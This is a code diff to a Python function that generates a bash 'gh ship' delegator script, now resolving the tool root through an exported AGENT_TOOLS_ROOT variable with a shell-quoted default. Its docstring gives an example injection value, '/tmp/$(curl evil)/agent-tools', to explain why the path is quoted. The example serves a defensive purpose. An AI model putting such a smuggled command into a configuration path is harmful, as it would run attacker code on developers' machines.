@@ -2513,19 +2513,22 @@ def ship_delegator_content(canonical_ship: Path) -> str:
     A thin delegator: the global ``gh ship`` alias runs ``<repo>/.claude/scripts/pr-ship.sh``; this
     script execs the canonical generalized ship implementation. It prefers a REPO-LOCAL
     ``ci/ship/ship.sh`` (so agent-tools — which carries the real ship.sh — self-hosts and always
-    runs its own checked-out version) and otherwise execs the rig-baked ``canonical_ship`` (the
-    ``ci/ship/ship.sh`` in the agent-tools checkout rig applied from), so ``gh ship`` works in every
-    other repo on a clean machine. Deterministic for a given ``canonical_ship`` so a re-apply / drift
-    compare is a byte-for-byte no-op; ``canonical_ship`` is the un-resolved configured/expanded path
-    rig stored at plan time.
+    runs its own checked-out version) and otherwise resolves the canonical via ``$AGENT_TOOLS_ROOT``,
+    with the rig-baked root as a bash default (``${var:=default}``) when the env var is unset.
+
+    ``AGENT_TOOLS_ROOT`` is exported so callers of this script inherit it — e.g. a spawned sub-shell
+    or a nested invocation. Set it in the environment to point at a different agent-tools checkout
+    without re-running ``rig apply``; that env value wins over the baked default.
 
     SECURITY: ``canonical_ship`` derives from the user-controlled ``agent_tools_source`` config, so
-    it is shell-quoted with :func:`shlex.quote` before being baked in. Without that, a path
+    the baked agent-tools root is shell-quoted with :func:`shlex.quote`. Without that, a path
     containing ``"``, ``$()``, backticks, or a space would either break the generated script or
     EXECUTE arbitrary commands every time ``gh ship`` runs (e.g. ``agent_tools_source:
     /tmp/$(curl evil)/agent-tools``). Single-quoting renders every metacharacter inert.
     """
-    canon = shlex.quote(str(canonical_ship))
+    # Derive the agent-tools root from the canonical ship.sh path (always ci/ship/ship.sh below root).
+    agent_tools_root = canonical_ship.parent.parent.parent
+    quoted_root = shlex.quote(str(agent_tools_root))
     return (
         "#!/usr/bin/env bash\n"
         "# Provisioned by rig (ship_delegator). The global `gh ship` alias runs\n"
@@ -2537,19 +2540,26 @@ def ship_delegator_content(canonical_ship: Path) -> str:
         # `git rev-parse` EXITS NON-ZERO outside a git repo; under `set -e` a failing command
         # substitution in this assignment would abort the whole script (exit 128) before we ever
         # reach the canonical fallback. Guard it: run git separately with `|| true` so a non-git cwd
-        # (or no git at all) just leaves toplevel empty and falls through to the baked path.
+        # (or no git at all) just leaves toplevel empty and falls through to the AGENT_TOOLS_ROOT path.
         'toplevel="$(git rev-parse --show-toplevel 2>/dev/null || true)"\n'
         'repo_local="${toplevel:+$toplevel/ci/ship/ship.sh}"\n'
         'if [[ -n "$repo_local" && -f "$repo_local" ]]; then\n'
         '  exec "$repo_local" "$@"\n'
         "fi\n"
-        # canonical is shlex.quote'd above — the value is user-derived (agent_tools_source).
-        f"canonical={canon}\n"
+        # AGENT_TOOLS_ROOT baked default is user-derived (agent_tools_source), so it is quoted.
+        # A temp var receives the single-quoted literal (safe for paths with spaces and metacharacters)
+        # then ${var:-default} substitution expands it — an env-supplied AGENT_TOOLS_ROOT wins.
+        # unset cleans the temp var; export propagates the resolved value to child processes.
+        f"_rig_default={quoted_root}\n"
+        'AGENT_TOOLS_ROOT="${AGENT_TOOLS_ROOT:-$_rig_default}"\n'
+        "unset _rig_default\n"
+        "export AGENT_TOOLS_ROOT\n"
+        'canonical="$AGENT_TOOLS_ROOT/ci/ship/ship.sh"\n'
         'if [[ -f "$canonical" ]]; then\n'
         '  exec "$canonical" "$@"\n'
         "fi\n"
         'echo "pr-ship.sh: canonical ship.sh not found (repo-local $repo_local nor $canonical)." >&2\n'
-        'echo "Re-run \'rig apply\' against a current agent-tools checkout to refresh it." >&2\n'
+        'echo "Set AGENT_TOOLS_ROOT to your agent-tools checkout, or re-run \'rig apply\'." >&2\n'
         "exit 127\n"
     )
 
